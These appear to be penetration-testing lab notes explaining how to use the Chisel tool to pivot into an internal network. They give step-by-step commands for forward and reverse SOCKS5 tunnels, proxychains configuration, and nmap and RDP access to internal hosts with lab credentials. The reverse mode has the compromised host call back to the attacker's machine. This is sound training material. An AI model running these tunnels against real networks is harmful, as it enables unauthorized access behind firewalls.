

---

## 1. Concept

- **Chisel** = tunneling tool (TCP/UDP over HTTP, secured with SSH)
    
- Used for **pivoting into internal networks**
    
- Creates a **SOCKS5 proxy tunnel**
    

### Problem it solves

- You **cannot directly access internal network (172.16.5.x)**
    
- But you have a **pivot host (Ubuntu) inside that network**
    

### Solution

- Use pivot host as a **bridge**
    
- Route traffic through it using **SOCKS proxy**
    

---

## 2. Architecture

```
Attack Host (10.10.x.x)
        |
   [Chisel Client]
        |
   HTTP Tunnel (SSH secured)
        |
   [Chisel Server]
Pivot Host (10.129.x.x)
        |
 Internal Network (172.16.5.x)
```

---

## 3. Forward Pivot (Normal Case)

### When to use

- Pivot host allows **incoming connections**
    

---

## Step 1 — Setup Chisel on Attack Host

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
```

Where:

- Run on **attack host**
    

Why:

- Build binary to use locally and transfer
    

---

## Step 2 — Transfer to Pivot Host

```bash
scp chisel ubuntu@10.129.202.64:~/
```

Where:

- Run on **attack host**
    

Why:

- Pivot host must run server
    

---

## Step 3 — Start Chisel Server (Pivot Host)

```bash
./chisel server -v -p 1234 --socks5
```

Where:

- Run on **pivot host (Ubuntu)**
    

What it does:

- Listens on port `1234`
    
- Creates SOCKS5 proxy
    
- Gives access to internal network
    

---

## Step 4 — Start Chisel Client (Attack Host)

```bash
./chisel client -v 10.129.202.64:1234 socks
```

Where:

- Run on **attack host**
    

What happens:

- Connects to pivot
    
- Opens local SOCKS proxy:
    
    ```
    127.0.0.1:1080
    ```
    

---

## Step 5 — Configure Proxychains

```bash
nano /etc/proxychains.conf
```

Add at bottom:

```bash
socks5 127.0.0.1 1080
```

Where:

- Edit on **attack host**
    

Why:

- Route tools through tunnel
    

---

## Step 6 — Access Internal Network

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

or

```bash
proxychains nmap 172.16.5.19
```

Where:

- Run on **attack host**
    

Why:

- Traffic flow:
    
    ```
    Attack → 127.0.0.1:1080 → Pivot → Internal network
    ```
    

---

## 4. Reverse Pivot (Important)

### When to use

- Pivot host **cannot accept incoming connections**
    
- Firewall blocks inbound
    

---

## Step 1 — Start Server on Attack Host

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```

Where:

- Run on **attack host**
    

Why:

- Allow pivot host to connect outward
    

---

## Step 2 — Start Client on Pivot Host

```bash
./chisel client -v 10.10.14.17:1234 R:socks
```

Where:

- Run on **pivot host**
    

What happens:

- Pivot connects to attack host
    
- Creates SOCKS proxy on attack host:
    
    ```
    127.0.0.1:1080
    ```
    

---

## Step 3 — Configure Proxychains

```bash
nano /etc/proxychains.conf
```

Add:

```bash
socks5 127.0.0.1 1080
```

Where:

- Edit on **attack host**
    

---

## Step 4 — Use Tunnel

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

Where:

- Run on **attack host**
    

---

## 5. Key Differences

|Type|Server runs on|Used when|
|---|---|---|
|Forward|Pivot host|Inbound allowed|
|Reverse|Attack host|Inbound blocked|

---

## 6. Important Points

- SOCKS proxy created on:
    
    ```
    127.0.0.1:1080
    ```
    
- Chisel uses:
    
    - HTTP transport
        
    - SSH encryption
        
- Works in **restricted/firewalled environments**
    
- Supports:
    
    - TCP + UDP
        

---

## 7. Full Attack Flow (Simple)

### Forward:

1. Build chisel (attack host)
    
2. Transfer to pivot (attack host → pivot)
    
3. Start server on pivot
    
4. Start client on attack host
    
5. Edit `/etc/proxychains.conf` on attack host
    
6. Use proxychains
    

### Reverse:

1. Start server on attack host
    
2. Run client on pivot (`R:socks`)
    
3. Edit `/etc/proxychains.conf` on attack host
    
4. Use proxychains
    

---

## 8. One-line Understanding

- Chisel = **SOCKS tunnel creator for pivoting into hidden networks using HTTP + SSH**
